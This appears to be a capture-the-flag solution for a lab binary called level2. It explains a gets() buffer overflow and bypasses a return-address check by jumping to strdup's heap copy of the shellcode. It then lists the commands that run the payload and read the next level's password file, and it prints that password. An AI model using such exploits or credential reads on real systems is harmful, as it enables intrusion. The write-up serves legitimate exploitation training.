solution level2:

-> with gdb, we see that the main simply calls a function called p

-> the function p uses gets, so we can certainly exploit the buffer overflow vulnerability. There are no functions in the program calling either system or execve so we will insert a shellcode in our buffer. This shellcode will launch a new shell with execve.

-> however, right after the calll to gets, the function fetches the return address (the saved eip) and performs a check:
...
0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
...

-> if the return address starts by 0xb, the function exits

-> else the function calls puts, then returns the return value of the call to strdup with the buffer as argument
...
0x08048532 <+94>:	lea    eax,[ebp-0x4c]
0x08048535 <+97>:	mov    DWORD PTR [esp],eax
0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
...

-> since our buffer is on the stack and the addresses of our stack frame start with 0xb, changing the return address to the beginning of the buffer won't work. We have to find another way to pass the address check at <p+44>

-> fortunately, the return value of our call to strdup is 0x804a008, which would pass the check. And we know the return value of strdup is the address of our duplicated buffer, in other words it points to the beginning of our shellcode.

> scp -P 2222 Ressources/run.sh level2@127.0.0.1:/tmp/

> bash -x /tmp/run.sh
> cat /tmp/overf - | ./level2
> cat /home/user/level3/.pass
> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
